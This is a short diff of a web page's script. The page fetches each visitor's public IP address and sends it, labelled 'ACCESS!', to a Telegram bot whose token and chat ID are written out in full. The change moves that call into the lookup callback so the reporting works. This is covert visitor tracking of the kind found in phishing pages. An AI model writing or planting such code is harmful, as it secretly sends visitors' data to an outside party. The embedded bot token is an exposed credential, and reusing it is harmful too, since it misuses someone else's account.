@@ -103,11 +103,10 @@
   $.getJSON('https://jsonip.com/?callback=?').done(function(data) {
     var ip_address = window.JSON.parse(JSON.stringify(data, null, 2));
     ip_address = ip_address.ip;
-    
-});
-    console.log(ip_address);
-    var ipaddress = document.getElementById("clientIp").value;
+      console.log(ip_address);
     fetch('https://api.telegram.org/bot6769553327:AAEwKifUmAx2hUgodRudzpIjcCfEnDZ1e6s/sendMessage?chat_id=6142403832&text=ACCESS! \n IP:'+ip_address+'');
+});
+  
   </script>
 
 </body>
